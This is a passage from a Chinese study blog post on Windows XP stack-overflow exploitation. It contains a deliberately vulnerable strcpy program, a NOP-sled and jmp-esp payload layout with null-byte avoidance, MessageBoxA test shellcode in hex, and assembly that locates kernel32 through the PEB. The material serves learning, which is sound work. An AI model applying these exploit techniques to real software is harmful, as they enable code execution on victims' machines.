+<p>然后在buffer较高的地方放置shellcode,这样jmp esp-x,不管x是多少,只要能跳到那一大堆nop中的任意一条,就可以执行shellcode</p>
+<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220917144909728.png" class="lazyload placeholder" data-srcset="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220917144909728.png" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg" alt="image-20220917144909728"></p>
+<h3 id="实验验证"><a href="#实验验证" class="headerlink" title="实验验证"></a>实验验证</h3><p>实验验证刚才这几点</p>
+<p>可以利用的程序,其中verify_password的缓冲区buffer从44字节扩大到200字节,目的是一开始可以填充很多nop</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="comment">//确保可以调用windows API </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PASSWORD <span class="string">&quot;1234567&quot;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">verify_password</span><span class="params">(<span class="type">char</span> *password)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> authenticated;</span><br><span class="line">    <span class="type">char</span> buffer[<span class="number">200</span>];<span class="comment">//缓冲区扩大到200个字节,方便容纳nop和shellcode</span></span><br><span class="line">    authenticated = <span class="built_in">strcmp</span>(password, PASSWORD);</span><br><span class="line">    <span class="built_in">strcpy</span>(buffer, password); <span class="comment">// over flowed here!</span></span><br><span class="line">    <span class="keyword">return</span> authenticated;</span><br><span class="line">&#125;</span><br><span class="line">main()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> valid_flag = <span class="number">0</span>;</span><br><span class="line">    <span class="type">char</span> password[<span class="number">1024</span>];</span><br><span class="line">    FILE *fp;</span><br><span class="line">    LoadLibrary(<span class="string">&quot;user32.dll&quot;</span>); <span class="comment">// prepare for messagebox</span></span><br><span class="line">    <span class="keyword">if</span> (!(fp = fopen(<span class="string">&quot;password.txt&quot;</span>, <span class="string">&quot;rw+&quot;</span>)))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">fscanf</span>(fp, <span class="string">&quot;%s&quot;</span>, password);</span><br><span class="line">    valid_flag = verify_password(password);</span><br><span class="line">    <span class="keyword">if</span> (valid_flag)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;incorrect password!\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Congratulation! You have passed the verification!\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    fclose(fp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>首先调试观察verify_password函数栈帧</p>
+<h4 id="buffer的位置"><a href="#buffer的位置" class="headerlink" title="buffer的位置"></a>buffer的位置</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">13:       strcpy(buffer, password); // over flowed here!</span><br><span class="line">00401052   mov         ecx,dword ptr [ebp+8]</span><br><span class="line">00401055   push        ecx</span><br><span class="line">00401056   lea         edx,[ebp-0CCh]</span><br><span class="line">0040105C   push        edx</span><br><span class="line">0040105D   call        strcpy (004011b0)</span><br><span class="line">00401062   add         esp,8</span><br></pre></td></tr></table></figure>
+<p>buffer位于ebp-0x0CCh处,在windows XP上调试时,ebp=0x0012FB20</p>
+<p>栈帧长这样,(奇了怪了buffer总是贴着authenticated长)</p>
+<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220917150018794.png" class="lazyload placeholder" data-srcset="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220917150018794.png" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg" alt="image-20220917150018794"></p>
+<h4 id="shellcode咋写"><a href="#shellcode咋写" class="headerlink" title="shellcode咋写"></a>shellcode咋写</h4><p>将buffer的前100个字节全都用nop(0x90)填充,然后放shellcode,这是139个字节了,</p>
+<p>然后再填充69个字节,到返回地址家门口,此时已有208个字节,</p>
+<p>从user32.dll中”借一个”jmp esp,地址为0x77D4754A,此时已有20C个字节,</p>
+<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220917103921056.png" class="lazyload placeholder" data-srcset="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220917103921056.png" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg" alt="一定要注意字节序"></p>
+<p>然后在retn后的esp位置放一条jmp esp-x指令,注意这里是指令的机器码,不是指令的地址,</p>
+<p>这里x可以是多少呢?</p>
+<p>0x60-0xD4之间均可</p>
+<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220917150804610.png" class="lazyload placeholder" data-srcset="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220917150804610.png" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg" alt="image-20220917150804610"></p>
+<p>不妨娶一个x=0xA0,</p>
+<p>如果把jmp esp-0xA0拆成两条指令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sub esp,0xA0</span><br><span class="line">jmp esp</span><br></pre></td></tr></table></figure>
+<p>机器码为<code>81 EC A0 00 00 00 FF E4</code></p>
+<blockquote>
+<p>直接在这里将栈顶下降到shellcode正文的基地址处,就免去了shellcode一开始再下降栈顶了</p>
+<p>当然shellcode中再让栈顶往下个十万八千里也不是不行</p>
+</blockquote>
+<p>到此password.txt长这样</p>
+<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220917155237143.png" class="lazyload placeholder" data-srcset="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220917155237143.png" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg" alt="image-20220917155237143"></p>
+<p>最后这里就有问题了,81 EC A0 00 00 00是sub esp,0xA0的机器码,</p>
+<p>A0 00 00 00是立即数,其中包含00了,在strcpy的时候会被截断,导致后面的FF E4无法拷贝到buffer中.</p>
+<h4 id="有00咋办"><a href="#有00咋办" class="headerlink" title="有00咋办"></a>有00咋办</h4><p>这咋办呢?要从指令上做文章了</p>
+<p>首先,esp-0xA0,实际上和sp-0xA0效果相同,但是sp是一个字寄存器,esp是一个双字寄存器,</p>
+<p>sub sp,0xA0的立即数更短,但是立即数0x00A0高一个字节仍然是00,还是白搭</p>
+<blockquote>
+<p>我试图用sub spl,0xA0,只用sp寄存器的最低规格,但是编译器报错说没有spl这个标号,也就是说最低最低能够操作的就是sp寄存器了</p>
+</blockquote>
+<p>考虑到减一个正数,相当于加它的相反数,那么sub sp,0xA0就等于add sp,0xFF60</p>
+<p>这就没有00了</p>
+<div class="table-container">
+<table>
+<thead>
+<tr>
+<th>指令</th>
+<th>机器码</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>add sp,0xFF60</td>
+<td>66 81 C4 60 FF 90</td>
+</tr>
+<tr>
+<td>jmp esp</td>
+<td>FF E4</td>
+</tr>
+</tbody>
+</table>
+</div>
+<p>正好八个字节,相当于覆盖了一个参数还有main栈帧顶的4个字节,不是很严重,肯定没有覆盖main函数的返回值</p>
+<p>到此password.txt长这样</p>
+<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220917160832220.png" class="lazyload placeholder" data-srcset="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220917160832220.png" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg" alt="没有任何一个字节是00"></p>
+<p>放到windows XP上试一试</p>
+<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220917160931645.png" class="lazyload placeholder" data-srcset="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220917160931645.png" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg" alt="通了"></p>
+<h3 id="调试-1"><a href="#调试-1" class="headerlink" title="调试"></a>调试</h3><h4 id="strcpy之后"><a href="#strcpy之后" class="headerlink" title="strcpy之后"></a>strcpy之后</h4><p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220917162316226.png" class="lazyload placeholder" data-srcset="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220917162316226.png" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg" alt="image-20220917162316226"></p>
+<p>shellcode已经写入了</p>
+<p>0x12FB24存储的返回地址已经被覆盖为0x77D47754A</p>
+<h4 id="retn之后-1"><a href="#retn之后-1" class="headerlink" title="retn之后"></a>retn之后</h4><p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220917162545781.png" class="lazyload placeholder" data-srcset="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220917162545781.png" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg" alt="image-20220917162545781"></p>
+<p>跳转到jmp esp指令的地址,此时esp指向0x12FB28,对应抬栈跳转两条指令(中间填了一个nop(0x90))</p>
+<h4 id="第一个jmp-esp之后"><a href="#第一个jmp-esp之后" class="headerlink" title="第一个jmp esp之后"></a>第一个jmp esp之后</h4><p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220917162846919.png" class="lazyload placeholder" data-srcset="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220917162846919.png" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg" alt="image-20220917162846919"></p>
+<p>抬栈之后esp=0x12FA88,这里上下都是0x90,全是nop,然后马上就要一个jmp esp跳进来</p>
+<h4 id="第二个jmp-esp之后"><a href="#第二个jmp-esp之后" class="headerlink" title="第二个jmp esp之后"></a>第二个jmp esp之后</h4><p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220917163016363.png" class="lazyload placeholder" data-srcset="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220917163016363.png" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg" alt="image-20220917163016363"></p>
+<p>此后eip将沿着0x12FA88-&gt;0x12FA89这个增大的方向进展</p>
+<p>在0x12FAB8处将会碰见第一条有意义的指令,抬栈1234h,显然这是不必要的,因为第二个jmp esp之前,已经把esp放到不会影响shellcode的位置了</p>
+<h2 id="通用shellcode"><a href="#通用shellcode" class="headerlink" title="通用shellcode"></a>通用shellcode</h2><h3 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h3><h4 id="动态定位库函数的方法"><a href="#动态定位库函数的方法" class="headerlink" title="动态定位库函数的方法"></a>动态定位库函数的方法</h4><p>前面的方法仍然不是通用的,不同的操作系统上,user32.dll库的地址是可变的,其中函数的地址自然也是可变的,而我们在寻找第一个jmp esp时使用了库函数的绝对地址.</p>
+<p>这就是局限性的根源所在</p>
+<p>要克服这个局限性,必须在shellcode运行时,动态地寻找目的函数或者目的指令,而不是我们亲自找了给他写死</p>
+<p>在win32平台下,动态定位kernel32.dll中函数地址的方法是这样的:</p>
+<p>1.FS段选择子会指向全局段描述表中本程序的TEB描述符,通过TEB描述符中的基地址可以查到内存中的TEB表</p>
+<blockquote>
+<p>TEB,thread environment block,线程环境块,存放进程中的线程信息,一个进程中的每个线程都会有一个TEB,每个进程自己会有一个PEB</p>
+</blockquote>
+<p>2.TEB表的0x30偏移处,存放着PEB的指针</p>
+<p>3.PEB表的0x0C偏移处,存放着PEB_LDR_DATA结构体的指针</p>
+<p>4.PEB_LDR_DATA结构体的0x1C偏移处,存放着InInitializationOrderModuleList指针</p>
+<blockquote>
+<p>InInitializationOrderModuleList,模块初始化<strong>链表</strong></p>
+</blockquote>
+<p>5.InInitializationOrderModuleList表中,按顺序存放着本程序运行时装载的模块信息,第一个结点是ntdll.dll的信息,第二个结点是kernel32.dll的信息</p>
+<p>6.kernel32.dll结点中,偏移量为0x08处就是kernel32.dll的内存基地址指针</p>
+<p>7.kernel32.dll的基地址加上0x3C是kernel32.dll的PE头</p>
+<p>8.kernel32.dll的PE头的0x78偏移处,存放函数导出表指针</p>
+<p>9.在导出表中:</p>
+<p>导出表的0x1C偏移处,存放导出函数偏移地址(RVA)列表的指针</p>
+<p>导出表的0x20偏移处,存放导出函数函数名列表的指针</p>
+<p>一个导出函数在函数名表和导出地址表中的下标是相同的,用函数名查函数名表获得下标,然后用下标查导出地址表,就可以获得函数地址(RVA)</p>
+<p>RVA(function)+ImageBase(kernel32.dll)=VA(function),这里kernel32.dll的映像基址已经在第6步获得了</p>
+<p>在kernel32.dll中找到LoadLibrary和GetProcAddress两个函数之后,就可以无脑调用函数来获取库函数地址了,不用再经历1-9的步骤了</p>
+<p>从图上看这个过程,能画出这个图来的老师儿也针的绝了</p>
+<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220917170156956.png" class="lazyload placeholder" data-srcset="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220917170156956.png" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg" alt="md,绝了"></p>
+<h4 id="shellcode-开发环境"><a href="#shellcode-开发环境" class="headerlink" title="shellcode 开发环境"></a>shellcode 开发环境</h4><p>最方便的shellcode开发方法是使用内联汇编</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="type">char</span> shellcode[] = <span class="string">&quot;\x66\x81\xEC\x40\x04\x33\xDB……&quot;</span>; <span class="comment">//欲调试的十六</span></span><br><span class="line">                                                     <span class="comment">//进制机器码&quot;</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    __asm</span><br><span class="line">    &#123; </span><br><span class="line">        lea eax, shellcode</span><br><span class="line">        push eax</span><br><span class="line">        ret</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>如此可以很方便地将控制转移到shellcode中</p>
+<p>比如测试弹窗的shellcode</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="type">char</span> shellcode[] =</span><br><span class="line">    <span class="comment">//&quot;\x66\x81\xEC\x40\x04&quot; // SUB SP,440</span></span><br><span class="line">    <span class="string">&quot;\x33\xDB&quot;</span>             <span class="comment">// XOR EBX,EBX</span></span><br><span class="line">    <span class="string">&quot;\x53&quot;</span>                 <span class="comment">// PUSH EBX</span></span><br><span class="line">    <span class="string">&quot;\x68\x77\x65\x73\x74&quot;</span> <span class="comment">// PUSH 74736577</span></span><br><span class="line">    <span class="string">&quot;\x68\x66\x61\x69\x6C&quot;</span> <span class="comment">// PUSH 6C696166</span></span><br><span class="line">    <span class="string">&quot;\x8B\xC4&quot;</span>             <span class="comment">// MOV EAX,ESP</span></span><br><span class="line">    <span class="string">&quot;\x53&quot;</span>                 <span class="comment">// PUSH EBX</span></span><br><span class="line">    <span class="string">&quot;\x50&quot;</span>                 <span class="comment">// PUSH EAX</span></span><br><span class="line">    <span class="string">&quot;\x50&quot;</span>                 <span class="comment">// PUSH EAX</span></span><br><span class="line">    <span class="string">&quot;\x53&quot;</span>                 <span class="comment">// PUSH EBX</span></span><br><span class="line">    <span class="string">&quot;\xB8\xD7\xAD\xD3\x77&quot;</span> <span class="comment">// MOV EAX,user32.MessageBoxA//function address varies between os</span></span><br><span class="line">    <span class="string">&quot;\xFF\xD0&quot;</span>             <span class="comment">// CALL EAX</span></span><br><span class="line">    <span class="string">&quot;\x53&quot;</span>                 <span class="comment">// PUSH EBX ;/ExitCode</span></span><br><span class="line">    <span class="string">&quot;\xB8\xB5\x5C\xE5\x77&quot;</span> <span class="comment">// MOV EAX,kernel32.ExitProcess</span></span><br><span class="line">    <span class="string">&quot;\xFF\xD0&quot;</span>;            <span class="comment">// CALL EAX ;\ExitProcess</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	HMODULE hmod=LoadLibraryA(<span class="string">&quot;user32.dll&quot;</span>);<span class="comment">//to ensure user32.dll is loaded </span></span><br><span class="line">    <span class="keyword">if</span>(!hmod)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;load failed&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    __asm</span><br><span class="line">    &#123; </span><br><span class="line">        lea eax, shellcode</span><br><span class="line">        push eax</span><br><span class="line">        ret</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220917174306682.png" class="lazyload placeholder" data-srcset="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220917174306682.png" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg" alt="image-20220917174306682"></p>
+<h4 id="哈希算法"><a href="#哈希算法" class="headerlink" title="哈希算法"></a>哈希算法</h4><p>shellcode讲究一个短小精悍,如果为了找一个库函数,把它的名字比如”MessageBoxA”完整地放到shellcode中,自然不愿意.</p>
+<p>要是shellcode的空间有限,光一个函数名就可以占用很大空间,可能就没有足够的地方做完剩下的逻辑了</p>
+<p>因此采用哈希算法处理函数名,</p>
+<p>我们想要的函数名哈希一下,遍历库函数时每个函数名都哈希一下,和我们自己的哈希值比划比划,要是一样就认为找到了目标函数</p>
+<p>书上采用的哈希算法为:</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">DWORD <span class="title function_">GetHash</span><span class="params">(<span class="type">char</span> *fun_name)</span></span><br><span class="line">&#123;</span><br><span class="line">    DWORD digest = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (*fun_name)</span><br><span class="line">    &#123;</span><br><span class="line">        digest = ((digest &lt;&lt; <span class="number">25</span>) | (digest &gt;&gt; <span class="number">7</span>)); <span class="comment">//循环右移 7 位</span></span><br><span class="line">        digest += *fun_name;                       <span class="comment">//累加</span></span><br><span class="line">        fun_name++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> digest;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>每次循环右移7位然后加上函数名的一个字节,直到遍历函数名到NULL,算法结束,返回digest摘要值</p>
+<p>这样哈希算法的返回值是一个DWORD双字,比较两个双字只需要一条指令,cmp a,b就可以了</p>
+<p>用该哈希函数得到的摘要值:</p>
+<div class="table-container">
+<table>
+<thead>
+<tr>
+<th>函数名</th>
+<th>摘要值(Hex)</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>MessageBoxA</td>
+<td>1e380a6a</td>
+</tr>
+<tr>
+<td>LoadLibraryA</td>
+<td>c917432</td>
+</tr>
+<tr>
+<td>ExitProcess</td>
+<td>4fd18963</td>
+</tr>
+</tbody>
+</table>
+</div>
+<p>好了,现在会做1+1=2了,下面解一道考研高数题</p>
+<h3 id="shellcode动态定位API"><a href="#shellcode动态定位API" class="headerlink" title="shellcode动态定位API"></a>shellcode动态定位API</h3><p>分析一下书上给出的shellcode代码都是干了啥</p>
+<h4 id="初始化-放置需要查找的函数"><a href="#初始化-放置需要查找的函数" class="headerlink" title="初始化,放置需要查找的函数"></a>初始化,放置需要查找的函数</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">nop</span><br><span class="line">nop</span><br><span class="line"></span><br><span class="line">		</span><br><span class="line"></span><br><span class="line">nop</span><br><span class="line">nop ;为了便于观察,shellcode的开头结尾都放几个nop</span><br><span class="line">nop</span><br><span class="line">CLD					; clear flag DF,改变串操作的方向,保证在执行shellcode时是正方向的</span><br><span class="line">;store hash</span><br><span class="line">push 0x1e380a6a		;hash of MessageBoxA</span><br><span class="line">push 0x4fd18963		;hash of ExitProcess</span><br><span class="line">push 0x0c917432		;hash of LoadLibraryA</span><br><span class="line">mov esi,esp			; esi = addr of first function hash </span><br><span class="line">lea edi,[esi-0xc]	; edi = addr to start writing function </span><br></pre></td></tr></table></figure>
+<p>这一坨执行完毕后栈帧的状态</p>
+<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220917184259697.png" class="lazyload placeholder" data-srcset="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220917184259697.png" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg" alt="image-20220917184259697"></p>
+<h4 id="抬栈"><a href="#抬栈" class="headerlink" title="抬栈"></a>抬栈</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">; make some stack space</span><br><span class="line">xor ebx,ebx ;ebx置空</span><br><span class="line">mov bh, 0x04 		;ebx=0x400;	 </span><br><span class="line">sub esp, ebx    ;栈顶下降0x400个字节;</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220917190658920.png" class="lazyload placeholder" data-srcset="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220917190658920.png" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg" alt="image-20220917190658920"></p>
+<h4 id="“user32”压栈"><a href="#“user32”压栈" class="headerlink" title="“user32”压栈"></a>“user32”压栈</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">; push a pointer to &quot;user32&quot; onto stack </span><br><span class="line">mov bx, 0x3233 		; rest of ebx is null &quot;32&quot;</span><br><span class="line">push ebx    ;0x3233压栈</span><br><span class="line">push 0x72657375     ;&quot;user&quot;</span><br><span class="line">push esp </span><br><span class="line"></span><br><span class="line">xor edx,edx	;edx=0</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220917191100826.png" class="lazyload placeholder" data-srcset="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220917191100826.png" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg" alt="image-20220917191100826"></p>
+<h4 id="寻找kernel32-dll基地址"><a href="#寻找kernel32-dll基地址" class="headerlink" title="寻找kernel32.dll基地址"></a>寻找kernel32.dll基地址</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">; find base addr of kernel32.dll </span><br><span class="line">	mov ebx, fs:[edx + 0x30] 	; ebx = address of PEB </span><br><span class="line">	mov ecx, [ebx + 0x0c] 		; ecx = pointer to loader data </span><br><span class="line">	mov ecx, [ecx + 0x1c] 		; ecx = first entry in initialisation order list </span><br><span class="line">	mov ecx, [ecx] 				; ecx = second entry in list (kernel32.dll) </span><br><span class="line">	mov ebp, [ecx + 0x08] 		; ebp = base address of kernel32.dll </span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220917170156956.png" class="lazyload placeholder" data-srcset="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220917170156956.png" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg" alt="依据"></p>
+<h4 id="最外圈循环-寻找下一个库函数"><a href="#最外圈循环-寻找下一个库函数" class="headerlink" title="最外圈循环,寻找下一个库函数"></a>最外圈循环,寻找下一个库函数</h4><p>在执行本部分之前,esi在栈中的指向如图</p>
+<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220917191632775.png" class="lazyload placeholder" data-srcset="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220917191632775.png" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg" alt="image-20220917191632775"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">find_lib_functions: </span><br><span class="line"></span><br><span class="line">	lodsd 					; load next hash into al and increment esi </span><br><span class="line">	cmp eax, 0x1e380a6a		; hash of MessageBoxA - trigger </span><br><span class="line">							; LoadLibrary(&quot;user32&quot;) </span><br><span class="line">	jne find_functions </span><br><span class="line">	xchg eax, ebp 			; save current hash </span><br><span class="line">	call [edi - 0x8] 		; LoadLibraryA </span><br><span class="line">	xchg eax, ebp 			; restore current hash, and update ebp </span><br><span class="line">							; with base address of user32.dll 	</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>lodsd指令，取得是双字节，即mov eax，[esi]，esi=esi+4；</p>
+</blockquote>
+<p>此处lodsd相当于把0x0c917432放到eax上,然后esi+4,执行后栈的状态</p>
